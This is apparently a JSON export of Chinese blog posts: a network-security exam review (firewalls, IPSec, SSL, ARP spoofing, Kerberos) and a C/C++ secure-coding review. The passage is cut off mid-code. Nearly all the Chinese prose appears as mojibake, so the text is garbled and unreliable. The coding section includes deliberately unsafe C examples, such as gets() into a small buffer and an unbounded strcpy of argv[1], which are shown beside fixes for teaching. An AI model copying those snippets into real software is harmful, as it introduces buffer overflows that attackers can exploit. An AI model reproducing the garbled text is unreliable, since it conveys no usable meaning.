ä¸‰ã€åè¯è§£é‡Š\n**1.**\tæœºå¯†æ€§ã€å®Œæ•´æ€§ã€å¯ç”¨æ€§ã€å¯æ§æ€§\nç­”ï¼šæœºå¯†æ€§æ˜¯ç¡®ä¿ä¿¡æ¯ä¸æš´éœ²ç»™æœªç»æˆæƒçš„äººæˆ–åº”ç”¨è¿›ç¨‹ï¼›\nå®Œæ•´æ€§æ˜¯æŒ‡åªæœ‰å¾—åˆ°å…è®¸çš„äººæˆ–åº”ç”¨è¿›ç¨‹æ‰èƒ½ä¿®æ”¹æ•°æ®ï¼Œå¹¶ä¸”èƒ½å¤Ÿåˆ¤åˆ«å‡ºæ•°æ®æ˜¯å¦å·²è¢«æ›´æ”¹ï¼›\nå¯ç”¨æ€§æ˜¯æŒ‡åªæœ‰å¾—åˆ°æˆæƒçš„ç”¨æˆ·åœ¨éœ€è¦æ—¶æ‰å¯ä»¥è®¿é—®æ•°æ®ï¼Œå³ä½¿åœ¨ç½‘ç»œè¢«æ”»å‡»æ—¶ä¹Ÿä¸èƒ½é˜»ç¢æˆæƒç”¨æˆ·å¯¹ç½‘ç»œçš„ä½¿ç”¨ï¼› \nå¯æ§æ€§æ˜¯æŒ‡èƒ½å¤Ÿå¯¹æˆæƒèŒƒå›´å†…çš„ä¿¡æ¯æµå‘å’Œè¡Œä¸ºæ–¹å¼è¿›è¡Œæ§åˆ¶\n**2.**\té˜²ç«å¢™\nç­”ï¼šé˜²ç«å¢™æ˜¯æŒ‡è®¾ç½®åœ¨ä¸åŒç½‘ç»œï¼ˆå¦‚å¯ä¿¡èµ–çš„ä¼ä¸šå†…éƒ¨å±€åŸŸç½‘å’Œä¸å¯ä¿¡èµ–çš„å…¬å…±ç½‘ç»œï¼‰ä¹‹é—´æˆ–ç½‘ç»œå®‰å…¨åŸŸä¹‹é—´çš„ä¸€ç³»åˆ—éƒ¨ä»¶çš„ç»„åˆï¼Œé€šè¿‡ç›‘æµ‹ã€é™åˆ¶ã€æ›´æ”¹è¿›å…¥ä¸åŒç½‘ç»œæˆ–ä¸åŒå®‰å…¨åŸŸçš„æ•°æ®æµï¼Œå°½å¯èƒ½åœ°å¯¹å¤–éƒ¨å±è”½ç½‘ç»œå†…éƒ¨çš„ä¿¡æ¯ã€ç»“æ„å’Œè¿è¡ŒçŠ¶å†µï¼Œä»¥é˜²æ­¢å‘ç”Ÿä¸å¯é¢„æµ‹çš„ã€æ½œåœ¨ç ´åæ€§çš„å…¥ä¾µï¼Œå®ç°ç½‘ç»œçš„å®‰å…¨ä¿æŠ¤ã€‚\n**3.**\tVPN\nç­”ï¼šVPNï¼ˆè™šæ‹Ÿä¸“ç”¨ç½‘ï¼‰æ˜¯åˆ©ç”¨ Internet ç­‰å…¬å…±ç½‘ç»œçš„åŸºç¡€è®¾æ–½ï¼Œé€šè¿‡éš§é“æŠ€æœ¯ï¼Œä¸ºç”¨æˆ·æä¾›ä¸€æ¡ä¸ä¸“ç”¨ç½‘ç»œå…·æœ‰ç›¸åŒé€šä¿¡åŠŸèƒ½çš„å®‰å…¨æ•°æ®é€šé“ï¼Œå®ç°ä¸åŒç½‘ç»œä¹‹é—´ä»¥åŠç”¨æˆ·ä¸ç½‘ç»œä¹‹é—´çš„ç›¸äº’è¿æ¥.\n**4.** PKI\nPKIæ˜¯åŸºäºå…¬é’¥å¯†ç æŠ€æœ¯ï¼Œæ”¯æŒå…¬é’¥ç®¡ç†ï¼Œæä¾›çœŸå®æ€§ã€ä¿å¯†æ€§ã€å®Œæ•´æ€§ä»¥åŠå¯è¿½ç©¶æ€§çš„å®‰å…¨æœåŠ¡ï¼Œå…·æœ‰æ™®é€‚æ€§çš„å®‰å…¨åŸºç¡€è®¾æ–½ã€‚\n**5.** æ•°å­—è¯ä¹¦\næ•°å­—è¯ä¹¦æ˜¯ä¸€ä¸ªç»æ•°å­—è¯ä¹¦æˆæƒä¸­å¿ƒæ•°å­—ç­¾åçš„åŒ…å«å…¬å¼€å¯†é’¥æ‹¥æœ‰è€…ä¿¡æ¯ä»¥åŠå…¬å¼€å¯†é’¥çš„æ–‡ä»¶ã€‚\n**6.** è®¿é—®æ§åˆ™\nåŒ…æ‹¬èº«ä»½è®¤è¯å’Œæƒé™éªŒè¯ç”¨äºé˜²æ­¢æœªæˆæƒç”¨æˆ·éæ³•ä½¿ç”¨æˆ–è¶Šæƒä½¿ç”¨ç³»ç»Ÿèµ„æº\n**7.** è¢«åŠ¨æ”»å‡»\nè¯•å›¾æ”¶é›†ã€åˆ©ç”¨ç³»ç»Ÿçš„ä¿¡æ¯ä½†ä¸å½±å“ç³»ç»Ÿçš„æ­£å¸¸è®¿é—®ï¼Œæ•°æ®çš„åˆæ³•ç”¨æˆ·å¯¹è¿™ç§æ´»åŠ¨ä¸€èˆ¬ä¸ä¼šè§‰å¯Ÿåˆ°ã€‚\nè¢«åŠ¨æ”»å‡»æ–¹å¼ï¼šä¿¡æ¯æ”¶é›†å’Œæµé‡åˆ†æ\n**8.** ä¸»åŠ¨æ”»å‡»\næ”»å‡»è€…è®¿é—®ä»–æ‰€éœ€ä¿¡æ¯çš„æ•…æ„è¡Œä¸ºï¼Œä¸€èˆ¬ä¼šæ”¹å˜ç³»ç»Ÿèµ„æºæˆ–å½±å“ç³»ç»Ÿè¿ä½œã€‚ \n### å››ã€ç®€ç­”é¢˜\n**1.** OSIç½‘ç»œå®‰å…¨ä½“ç³»ç»“æ„çš„äº”ç±»å®‰å…¨æœåŠ¡å’Œå…«ç±»å®‰å…¨æœºåˆ¶åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿ\nç­”ï¼šäº”å¤§ç±»å®‰å…¨æœåŠ¡(é‰´åˆ«ã€è®¿é—®æ§åˆ¶ã€ä¿å¯†æ€§ã€å®Œæ•´æ€§ã€æŠ—å¦è®¤ï¼‰\nå…«ç±»å®‰å…¨æœºåˆ¶(åŠ å¯†ã€æ•°å­—ç­¾åã€è®¿é—®æ§åˆ¶ã€æ•°æ®å®Œæ•´æ€§ã€é‰´åˆ«äº¤æ¢ã€ä¸šåŠ¡æµå¡«å……ã€è·¯ç”±æ§åˆ¶ã€å…¬è¯ï¼‰\n**2.** åŒ…è¿‡æ»¤é˜²ç«å¢™çš„åŸºæœ¬æ€æƒ³æ˜¯ä»€ä¹ˆï¼Ÿ\nç­”ï¼š åŒ…è¿‡æ»¤é˜²ç«å¢™çš„åŸºæœ¬æ€æƒ³ï¼šå¯¹æ‰€æ¥æ”¶çš„æ¯ä¸ªæ•°æ®åŒ…è¿›è¡Œæ£€æŸ¥ï¼Œæ ¹æ®è¿‡æ»¤è§„åˆ™ï¼Œç„¶åå†³å®šè½¬å‘æˆ–è€…ä¸¢å¼ƒè¯¥åŒ…ï¼›åŒ…è¿‡æ»¤é˜²ç«å¢™å¾€å¾€é…ç½®æˆåŒå‘çš„ï¼›\n**3.** IPSecæ˜¯å“ªä¸€å±‚çš„å®‰å…¨åè®®ï¼Ÿå…¶ä¸»è¦ç‰¹å¾æ˜¯ä»€ä¹ˆï¼Ÿå…¶åè®®éƒ¨åˆ†ç”±å“ªä¸¤éƒ¨åˆ†ç»„æˆï¼Ÿ\nç­”ï¼šIPSecæ˜¯ç½‘ç»œå±‚çš„å®‰å…¨åè®®ï¼Œå…¶ä¸»è¦ç‰¹å¾æ˜¯å¯ä»¥æ”¯æŒIPçº§æ‰€æœ‰æµé‡çš„åŠ å¯†å’Œ/æˆ–è®¤è¯ã€‚å› æ­¤å¯ä»¥å¢å¼ºæ‰€æœ‰åˆ†å¸ƒå¼åº”ç”¨çš„å®‰å…¨æ€§ã€‚å…¶åè®®éƒ¨åˆ†åˆ†ä¸º:AHåè®®å’ŒESPåè®®ä¸¤éƒ¨åˆ†ã€‚\n**4.** ä»€ä¹ˆæ˜¯SSLï¼Ÿå®ƒæ˜¯å“ªä¸€å±‚çš„å®‰å…¨åè®®?\nç­”ï¼šSSL ï¼ˆSecure Socket Layerï¼‰æ˜¯ä¸€ç§åœ¨ä¸¤ä¸ªç«¯å®ä½“ï¼ˆEnd Entityï¼‰ä¹‹é—´æä¾›å®‰å…¨é€šé“çš„åè®®ã€‚å®ƒæ˜¯ä¼ è¾“å±‚çš„å®‰å…¨åè®®ã€‚\n**5.** ä»€ä¹ˆæ˜¯IPæ¬ºéª—æ”»å‡»ï¼Ÿ\nç­”ï¼šIPæ¬ºéª—æ”»å‡»å°±æ˜¯æ”»å‡»è€…ä¼ªè£…æˆç›®æ ‡ä¸»æœºä¸å…¶ä»–è®¡ç®—æœºè¿›è¡Œé€šä¿¡ï¼Œè¾¾åˆ°ï¼šéšè—è‡ªå·±çš„IPåœ°å€ï¼Œé˜²æ­¢è¢«è·Ÿè¸ªï¼›ä»¥IPåœ°å€ä½œä¸ºæˆæƒä¾æ®ï¼›ç©¿è¶Šé˜²ç«å¢™çš„ç›®çš„\n**6.** è®¿é—®æ§åˆ¶åŸºæœ¬ç›®æ ‡æ˜¯ä»€ä¹ˆï¼Ÿä¸»è¦æœ‰å“ªå‡ ç§è®¿é—®æ§åˆ¶ç­–ç•¥ï¼Ÿ\nç­”ï¼šè®¿é—®æ§åˆ¶åŸºæœ¬ç›®æ ‡æ˜¯é˜²æ­¢å¯¹ä»»ä½•èµ„æºï¼ˆå¦‚è®¡ç®—èµ„æºã€é€šä¿¡èµ„æºæˆ–ä¿¡æ¯èµ„æºï¼‰è¿›è¡Œæœªæˆæƒçš„è®¿é—®ã€‚ä»è€Œä½¿è®¡ç®—æœºç³»ç»Ÿåœ¨åˆæ³•èŒƒå›´å†…ä½¿ç”¨ï¼›å†³å®šç”¨æˆ·èƒ½åšä»€ä¹ˆï¼Œä¹Ÿå†³å®šä»£è¡¨ä¸€å®šç”¨æˆ·åˆ©ç›Šçš„ç¨‹åºèƒ½åšä»€ä¹ˆã€‚\nä¸»è¦è®¿é—®æ§åˆ¶ç­–ç•¥æœ‰ï¼šè‡ªä¸»è®¿é—®æ§åˆ¶ï¼ˆåŸºäºèº«ä»½çš„è®¿é—®æ§åˆ¶IBAC), å¼ºåˆ¶è®¿é—®æ§åˆ¶(åŸºäºè§„åˆ™çš„è®¿é—®æ§åˆ¶RBAC),åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶(role-based policies)\n**7.** æ·±å…¥åˆ†æInternetä¸å®‰å…¨çš„æ ¹æºæ˜¯ä»€ä¹ˆ?å¯é‡‡å–é‚£äº›ç›¸åº”çš„å®‰å…¨æªæ–½ï¼Ÿ\nä¸å®‰å…¨çš„æ ¹æºï¼š\nä¿¡æ¯äº¤æ¢å’Œå…±äº«æ—¥ç›Šä¾èµ–äºInternet\nåŸºäºTCP/IPåè®®ï¼Œè‡ªèº«ç¼ºä¹å®‰å…¨ç­–ç•¥\nå¤§é‡è®¾è®¡ç¼ºé™·å’Œå®‰å…¨æ¼æ´\nIPåè®®æ ˆå„å±‚éƒ½æœ‰å®‰å…¨é—®é¢˜\nå¤–æ¥æ”»å‡»è€…\nå®‰å…¨æªæ–½ï¼š\n1.ä»èº«ä»½è®¤è¯ã€è®¿é—®æ§åˆ¶ã€å¯†ç å­¦ã€é˜²ç«å¢™ç­‰æŠ€æœ¯å…¥æ‰‹ï¼Œæ„å»ºå®‰å…¨é˜²æŠ¤ä½“ç³»\n2.æ¨å¹¿å…ˆè¿›ä¿¡æ¯æŠ€æœ¯ï¼Œå»ºç«‹ä¿¡æ¯å®‰å…¨åˆ¶åº¦\n3.å¢å¼ºé˜²ç«å¢™æ§åˆ¶ï¼ŒåŠ å¼ºç—…æ¯’é˜²å¾¡å·¥ä½œ\n**8.** ä¸ºä»€ä¹ˆIPSecä¸­çš„AHåè®®ä¸NATæœ‰å†²çª?\nAHéƒ½ä¼šè®¤è¯æ•´ä¸ªæ•°æ®åŒ…ã€‚å¹¶ä¸”AHè¿˜ä¼šè®¤è¯ä½äºAHå¤´ä¹‹å‰çš„IPå¤´ã€‚å½“NATè®¾å¤‡ä¿®æ”¹äº†IPå¤´ä¹‹åï¼ŒIPSec å°±ä¼šè®¤ä¸ºè¿™æ˜¯å¯¹æ•°æ®åŒ…å®Œæ•´æ€§çš„ç ´åï¼Œä»è€Œä¸¢å¼ƒæ•°æ®åŒ…ã€‚å› æ­¤AHæ˜¯ä¸å¯èƒ½å’ŒNATåœ¨ä¸€èµ·å·¥ä½œçš„ã€‚\n**9.** åœ¨å¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½è®¤è¯æ—¶ï¼Œä½¿ç”¨ç”¨æˆ·å/å£ä»¤æ˜¯ä¸€ç§å¸¸ç”¨çš„èº«ä»½è®¤è¯æ–¹å¼ï¼Œè¯·åˆ†æè¯¥è®¤è¯æ–¹æ³•çš„ä¼˜ç¼ºç‚¹ï¼Œå¹¶æå‡ºä¸€äº›æ”¹è¿›çš„å»ºè®®ã€‚\n**ä¼˜ç‚¹ï¼š**ç®€å•ï¼Œæ˜“å®ç°ï¼Œæ˜“ç†è§£å’Œæ¥å—ï¼Œæˆæœ¬ä½ï¼Œæ— é¡»ä»»ä½•é™„åŠ è®¾å¤‡\n**ç¼ºç‚¹ï¼š**å£ä»¤ä¸€æ—¦è¢«æ³„éœ²ï¼Œç”¨æˆ·å³å¯è¢«å†’å……ã€‚å£ä»¤å®¹æ˜“è¢«çŒœè§£ï¼Œå£ä»¤åœ¨ç½‘ç»œä¸Šä¼ è¾“çš„è¿‡ç¨‹å¯èƒ½è¢«æˆªè·ã€‚å£ä»¤æ–¹æ¡ˆæ— æ³•æŠµæŠ—é‡æ”¾æ”»å‡»ã€‚åªèƒ½è¿›è¡Œå•å‘è®¤è¯ã€‚\n**æ”¹è¿›å»ºè®®ï¼š**\n1.å°½å¯èƒ½åœ°é€‰ç”¨æ˜“è®°ã€éš¾çŒœã€åº·åˆ†æèƒ½åŠ›å¼ºã€èƒ½è¾ƒå¥½åœ°æŠµæŠ—ç¦»çº¿å­—å…¸æ”»å‡»å’Œåœ¨çº¿å­—å…¸æ”»å‡»çš„å£ä»¤ã€‚\n2.å¯¹å£ä»¤çš„å­˜å‚¨åŠ å¯†ï¼Œå°½å¯èƒ½åœ°é€‰ç”¨Hashæ•£åˆ—å€¼æ–¹å¼å­˜å‚¨å£ä»¤\n3.é€‰ç”¨åŠ¨æ€å£ä»¤è®¤è¯æŠ€æœ¯\n**10.** ä¿¡æ¯å®‰å…¨çš„äº”å¤§ç‰¹æ€§ä¸ºä¿å¯†æ€§ã€å®Œæ•´æ€§ã€å¯ç”¨æ€§ã€å¯æ§æ€§ã€ä¸å¯å¦è®¤æ€§ï¼Œè¯·åˆ†åˆ«è§£é‡Šè¿™äº›æ€§è´¨ï¼Œå¹¶ç»™å‡ºå®ç°è¿™äº›æ€§è´¨çš„å¯†ç å­¦æ–¹æ³•ã€‚\n**æœºå¯†æ€§**ï¼šä¿è¯ä¿¡æ¯ä¸ä¿¡æ¯ç³»ç»Ÿä¸è¢«éæˆæƒçš„ç”¨æˆ·ã€å®ä½“æˆ–è¿‡ç¨‹æ‰€è·å–ä¸ä½¿ç”¨\n**å®Œæ•´æ€§**ï¼šä¿¡æ¯åœ¨å­˜è´®æˆ–ä¼ è¾“æ—¶ä¸è¢«ä¿®æ”¹ã€ç ´åï¼Œæˆ–ä¸å‘ç”Ÿä¿¡æ¯åŒ…ä¸¢å¤±ã€ä¹±åºç­‰\n**å¯ç”¨æ€§**ï¼šä¿¡æ¯ä¸ä¿¡æ¯ç³»ç»Ÿå¯è¢«æˆæƒå®ä½“æ­£å¸¸è®¿é—®çš„ç‰¹æ€§ï¼Œå³æˆæƒå®ä½“å½“éœ€è¦æ—¶èƒ½å¤Ÿå­˜å–æ‰€éœ€ä¿¡æ¯ \n**å¯æ§æ€§**ï¼šå¯¹ä¿¡æ¯çš„å­˜å‚¨äºä¼ æ’­å…·æœ‰å®Œå…¨çš„æ§åˆ¶èƒ½åŠ›ï¼Œå¯ä»¥æ§åˆ¶ä¿¡æ¯çš„æµå‘å’Œè¡Œä¸ºæ–¹å¼\n**ä¸å¯å¦è®¤æ€§**ï¼šäººä»¬ä¸èƒ½å¦è®¤è‡ªå·±å‘é€ä¿¡æ¯çš„è¡Œä¸ºå’Œä¿¡æ¯çš„å†…å®¹ã€‚\n`æœºå¯†æ€§->åŠ å¯†ç®—æ³• å®Œæ•´æ€§->æ¶ˆæ¯é‰´åˆ« å¯ç”¨æ€§->è®¿é—®æ§åˆ¶    å¯æ§æ€§->è®¿é—®æ§åˆ¶    ä¸å¯å¦è®¤æ€§->æ•°å­—ç­¾å`\n\n### äº”ã€ç»¼åˆåˆ†æé¢˜\n**1.** å¾ˆå¤šç½‘ç»œæ”»å‡»éƒ½æ˜¯é’ˆå¯¹ç½‘ç»œåè®®çš„æ¼æ´è€Œå‘èµ·çš„æ”»å‡»ï¼Œä¾‹å¦‚ARPæ¬ºéª—ã€‚è¯·ä»‹ç»ARPåè®®ï¼Œåˆ†æARPåè®®çš„æ¼æ²³ï¼Œé’ˆå¯¹è¿™æ ·çš„æ¼æ´ï¼Œæ•Œæ‰‹å¯èƒ½å‘èµ·æ€æ ·çš„æ”»å‡»?\nARPåè®®æ˜¯ä¸€ç§å°†IPåœ°å€è½¬æ¢æˆç‰©ç†åœ°å€çš„åè®®ï¼Œä»¥ä¾¿è®¾å¤‡èƒ½å¤Ÿåœ¨å…±äº«ä»‹è´¨çš„ç½‘ç»œï¼ˆå¦‚ä»¥å¤ªç½‘ï¼‰ä¸­é€šä¿¡ã€‚\nARPæ¬ºéª—å°±æ˜¯ä¸€ç§é€šè¿‡è™šå‡è¯·æ±‚æˆ–å“åº”æŠ¥æ–‡ï¼Œä½¿å¾—å…¶å®ƒä¸»æœºçš„ARPåˆ—è¡¨å‘ç”Ÿæ”¹å˜è€Œæ— æ³•æ­£å¸¸é€šä¿¡çš„æ”»å‡»è¡Œä¸ºã€‚\né’ˆå¯¹ä¸»æœºçš„ARPæ¬ºéª—ï¼šå†’å……å…¶å®ƒä¸»æœºï¼Œæ¥æ”¶è¯¥ä¸»æœºçš„ä¿¡æ¯\né’ˆå¯¹äº¤æ¢æœºçš„ARPæ¬ºéª—ï¼šåˆ©ç”¨å·¥å…·äº§ç”Ÿæ¬ºéª—MACï¼Œå¹¶å¿«é€Ÿå¡«æ»¡äº¤æ¢æœºçš„MACåœ°å€è¡¨\n**2.** ç”¨æˆ·Aå’ŒBåœ¨Internetä¸Šé€šä¿¡ã€‚Aæ˜¯å‘é€æ–¹ï¼Œä»–éœ€è¦å°†æ¶ˆæ¯må‘é€ç»™B.ç”±äºmæ˜¯éå¸¸é‡è¦çš„æ¶ˆæ¯ï¼Œä»–ä»¬ä¸å¸Œæœ›è¯¥æ¶ˆæ¯çš„å†…å®¹è¢«å…¶ä»–äººå¾—åˆ°ã€‚å¯¹äºæ¥æ”¶æ–¹B,ä»–è¿˜éœ€è¦ç¡®ä¿¡è¯¥æ¶ˆæ¯æ˜¯Aå‘æ¥çš„ä¸”æ¶ˆæ¯måœ¨é€šä¿¡è¿‡ç¨‹ä¸­æ²¡æœ‰è¢«ç¯¡æ”¹ï¼Œå·²çŸ¥Açš„å…¬ç§é’¥å¯¹ä¸ºï¼ˆpkA,skAï¼‰,Bçš„å…¬ç§é’¥å¯¹ä¸ºï¼ˆpkB,sKBï¼‰ã€‚è¯·è¿ç”¨å¯†ç å­¦å’Œç½‘ç»œå®‰å…¨çŸ¥è¯†ï¼Œè®¾è®¡ä¸€ä¸ªAä¸Bé€šä¿¡çš„åè®®ï¼Œå¹¶åˆ†æä½ çš„åè®®æ˜¯å¦‚ä½•æ»¡è¶³ä¸Šè¿°å®‰å…¨è¦æ±‚çš„ã€‚\n![](https://i.loli.net/2019/11/12/86mEWXtqMfuDpvo.jpg)\n**6. ä¸‹åˆ—åè®®æ˜¯Kerberosè®¤è¯ç³»ç»Ÿå®ç°è®¤è¯çš„æ ¸å¿ƒåè®®ï¼Œè¯¥åè®®ä»¥KDCä¸ºå¯ä¿¡ç¬¬ä¸‰æ–¹è¿›è¡Œé›†ä¸­å¼è®¤è¯ã€‚é€šä¿¡åŒæ–¹ï¼ˆç”¨æˆ·Aå’ŒæœåŠ¡å™¨Bï¼‰é€šè¿‡è¯¥åè®®å»ºç«‹å…±äº«çš„ä¼šè¯å¯†é’¥ï¼Œå¹¶å®ç°å¯¹åŒæ–¹çš„è®¤è¯ã€‚è¯¥åè®®çš„æè¿°åŠ ä¸‹ï¼š\n1.A->KDC: IDA||IDB||N1\n2.KDC->A: Eka[Ks||IDB||N1||Ekb[Ks||IDA]]\n3.A->B:  EKb[Ks||IDA]\n4.B->A:  EKs[l am bob||N2]\n5.A->B:  EKs[i am alie||f(N2)]\nå…¶ä¸­,Kaå’ŒKbåˆ†åˆ«æ˜¯Aä¸KDC,Bä¸KDCäº‹å…ˆå…±äº«çš„ä¸»å¯†æœº:Ksæ˜¯KDCäº§ç”Ÿçš„ä¼šè¯å¯†é’¥: N:å’ŒN2æ˜¯Aå’ŒBäº§ç”Ÿçš„ä¸´æ—¶å€¼(nonce):ï¼ˆæ˜¯åŒæ–¹é€‰å®šçš„ä¸€ä¸ªå‡½æ•°ã€‚ è¯·ç”¨æ–‡å­—æè¿°è¯¥åè®®çš„æ¯ä¸ªæ­¥éª¤åŠå…¶ä½œç”¨ï¼Œ å¹¶åˆ†æè¯¥åè®®å¦‚ä½•å®ç°äº†Aä¸Bä¹‹é—´çš„è®¤è¯ã€‚**\n1.Aå…ˆå‘Šè¯‰KDCï¼Œè¦å’ŒBé€šä¿¡ï¼ŒN1é˜²æ­¢æ”»å‡»æ–¹é€šè¿‡æ¶ˆæ¯é‡æ”¾å‡å†’KDC\n2.KDCç”Ÿæˆä¸€ä¸ªä¼šè¯å¯†é’¥Ksï¼Œå¹¶ç”¨Açš„å¯†é’¥åŠ å¯†å‘ç»™Aã€‚åŒæ—¶ï¼ŒKDCè¿˜ç”¨Bçš„å¯†é’¥åŠ å¯†Ksï¼Œäº¤ç»™Aè½¬å‘ã€‚Aå®‰å…¨çš„è·å¾—ä¼šè¯å¯†é’¥Ks\n3.æŠŠç”¨Bçš„å¯†é’¥åŠ å¯†çš„Kså‘é€ç»™B.Bå®‰å…¨çš„è·å¾—ä¼šè¯å¯†é’¥Ks\n4.Bç”¨ä¼šè¯å¯†é’¥KsåŠ å¯†æŒ‘æˆ˜N2ï¼ŒN2çš„ä½œç”¨æ˜¯è¦æ±‚Aè¯æ˜è‡ªå·±çŸ¥é“Ks\n5.ä½¿Bç¡®ä¿¡Aå·²çŸ¥é“Ks,è‡³æ­¤Aå’ŒBè®¤è¯æˆåŠŸ\n\n","tags":["ç½‘ç»œå®‰å…¨æŠ€æœ¯"],"categories":["Course"]},{"title":"Cå’ŒC++å®‰å…¨ç¼–ç å¤ä¹ ","url":"/posts/57105.html","content":"## å­—ç¬¦ä¸²\n\n### 1.å­—ç¬¦ä¸²åŸºç¡€\næ ‡å‡†Cè¯­è¨€åº“æ”¯æŒç±»å‹ä¸º`char`çš„å­—ç¬¦ä¸²å’Œç±»å‹ä¸º`wchar_t`çš„å®½å­—ç¬¦ä¸²ã€‚\nå­—ç¬¦ä¸²ç”±ä¸€ä¸ªä»¥ç©ºå­—ç¬¦(null)ä½œä¸ºç»“æŸçš„è¿ç»­å­—ç¬¦åºåˆ—ç»„æˆï¼Œå¹¶åŒ…å«æ­¤ç©ºå­—ç¬¦(`sizeof=strlen+1`)\nä¸€ä¸ªæŒ‡å‘å­—ç¬¦ä¸²çš„æŒ‡é’ˆå®é™…æŒ‡å‘è¯¥å­—ç¬¦ä¸²çš„èµ·å§‹å­—ç¬¦ã€‚\n\næ•°ç»„å¤§å°ã€‚æ•°ç»„å¸¦æ¥çš„é—®é¢˜ä¹‹ä¸€æ˜¯ç¡®å®šå…¶å…ƒç´ æ•°é‡ï¼Œä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ï¼š\n```c\nvoid clear(int array[])\n{\n    for (size_t i = 0; i < sizeof(array) / sizeof(array[0]); ++i){\n    array[i] = 0;\n    }\n}\nvoid dowork(){\nint dis[12];\nclear(dis);\n/* ... */\n}\n```\narrayæ˜¯ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥å®ƒçš„ç±»å‹æ˜¯æŒ‡é’ˆã€‚å› æ­¤ï¼Œ`sizeof(array`)ç­‰äº`sizeof(int*)`ï¼Œ`sizeof(array) / sizeof(array[0])`è®¡ç®—ç»“æœéƒ½æ˜¯`1`ã€‚\n\n\nå­—ç¬¦æ•°ç»„åˆå§‹åŒ–ï¼šä¸è¦æŒ‡å®šä¸€ä¸ªç”¨å­—ç¬¦ä¸²å­—é¢å€¼åˆå§‹åŒ–çš„å­—ç¬¦æ•°ç»„çš„ç•Œé™\n```c\nconst char s[3] = \"abc\"; //ä¸å®‰å…¨å†™æ³•ï¼Œå°‘ä¸€ä¸ª'\\0'\nconst char s[] = \"abc\"; //æ¨èåˆå§‹åŒ–æ–¹å¼\n```\n### 2.å­—ç¬¦ä¸²çš„é•¿åº¦\nå¯¹ä¸€ä¸ªä»¥ç©ºå­—ç¬¦ç»“å°¾çš„å­—èŠ‚å­—ç¬¦ä¸²ï¼Œ`strlen()`ç»Ÿè®¡ç»ˆæ­¢ç©ºå­—èŠ‚å‰é¢çš„å­—ç¬¦æ•°é‡ã€‚ç„¶è€Œï¼Œå®½å­—ç¬¦å¯ä»¥åŒ…å«ç©ºå­—èŠ‚ï¼Œæ‰€ä»¥è®¡ç®—ç»“æœä¼šå‡ºé—®é¢˜ã€‚\n```c\nwchar_t wide_str1[] = L\"0123456789\";\n\nwchar_t *wide_str2 = (wchar_t*)malloc(strlen(wide_str1) + 1);\n\nif(wide_str2 == NULL)\n\n{\n\n/*å¤„ç†é”™è¯¯*/\n\n}\n\nfree(wide_str2);\n\nwide_str2 = NULL;\n```\nä½¿ç”¨`wcslen()`å¯ä»¥è®¡ç®—å®½å­—ç¬¦ä¸²çš„å¤§å°\n```c\nwchar_t wide_str1[] = L\"0123456789\";\n\nwchar_t *wide_str2 = (wchar_t*)malloc(wcslen(wide_str1) + 1);\n\nif(wide_str2 == NULL)\n\n{\n\n/*å¤„ç†é”™è¯¯*/\n\n}\n\nfree(wide_str2);\n\nwide_str2 = NULL;\n```\næ³¨æ„æ­¤é•¿åº¦æ²¡æœ‰ä¹˜`sizeof(wchar_t)`ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¸å¯¹,ä¸‹é¢æ˜¯æœ€ç»ˆæ­£ç¡®å†™æ³•ï¼š\n```c\nwchar_t wide_str1[] = L\"0123456789\";\n\nwchar_t *wide_str2 = (wchar_t*)malloc((wcslen(wide_str1)+1)*sizeof(wchar_t));\n\nif(wide_str2 == NULL)\n\n{\n\n/*å¤„ç†é”™è¯¯*/\n\n}\n\nfree(wide_str2);\n\nwide_str2 = NULL;\n```\n### 3.æ— ç•Œå­—ç¬¦ä¸²å¤åˆ¶\nå¦‚æœè¾“å…¥è¶…å‡º8ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆä¼šå¯¼è‡´æœªå®šä¹‰çš„è¡Œä¸ºã€‚å› æ­¤ä¸è¦ä»ä¸€ä¸ªæ— ç•Œæºå¤åˆ¶æ•°æ®åˆ°å®šé•¿æ•°ç»„ä¸­ï¼Œç¦æ­¢è¿™ç§æ–¹æ³•ã€‚\nå±é™©æ€§ï¼šè°èƒ½ä¿è¯è¾“å…¥è€…åªä¼šæŒ‰8ä¸ªé”®ï¼Ÿ\né¿å…æ–¹å¼ï¼šæ°¸è¿œä¸ç”¨gets()å‡½æ•°ï¼\n```c\nvoid get_y_or_n(){\n    char response[8];\n    puts(\"Continue? [y] n:\");\n    gets(response);\n    if(response[0] == 'n')\n    exit(0);\n return;\n }\n```\nå…¶å®gets()å‡½æ•°åœ¨C99ä¸­ä»¥åºŸå¼ƒå¹¶åœ¨C11ä¸­æ·˜æ±°ã€‚å®ƒæ²¡æœ‰æä¾›æ–¹æ³•æŒ‡å®š`è¯»å…¥çš„å­—ç¬¦æ•°çš„é™åˆ¶`ã€‚è¿™ç§é™åˆ¶åœ¨æ­¤å‡½æ•°çš„å¦‚ä¸‹å®ç°ä¸­æ˜¯æ˜¾è€Œæ˜“è§çš„ï¼š\n```c\nchar *gets(char *dest){\n    int c = getchar();\n    char *p = dest;\n    while(c != EOF && c != '\\n')\n    {\n        *p++ = c;\n        c = getchar();\n    }\n    *p = '\\0';\n    return dest;\n}\n```\né”™è¯¯ç¤ºä¾‹1ï¼šæ‹·è´å­—ç¬¦ä¸²æ—¶ï¼Œæºå­—ç¬¦ä¸²é•¿åº¦å¯èƒ½å¤§äºç›®æ ‡æ•°ç»„ç©ºé—´ã€‚\n```c\nvoid main(int argc, char *argv[])\n{\n\tchar dst[128];\n\tif ï¼ˆ argc > 1 ï¼‰\n\t{\n\t\tstrcpy(dst, argv[1]);  // æºå­—ç¬¦ä¸²é•¿åº¦å¯èƒ½å¤§äºç›®æ ‡æ•°ç»„ç©ºé—´ï¼Œé€ æˆç¼“å†²åŒºæº¢å‡º\n\t}\n\t/*â€¦*/ \n}\n```\næ¨èåšæ³•ï¼šæ ¹æ®æºå­—ç¬¦ä¸²é•¿åº¦æ¥ä¸ºç›®æ ‡å­—ç¬¦ä¸²åˆ†é…ç©ºé—´ã€‚\n```c\nvoid main(int argc, char *argv[])\n{\n\tchar *dst = NULL;\n\tif ï¼ˆ argc > 1 ï¼‰\n\t{\n\t\tdst = (char *)malloc(strlen(argv[1]) + 1); /* ã€ä¿®æ”¹ã€‘ç¡®ä¿å­—ç¬¦ä¸²ç©ºé—´è¶³å¤Ÿå®¹çº³argv[1] */\n\t\tif( dst != NULL 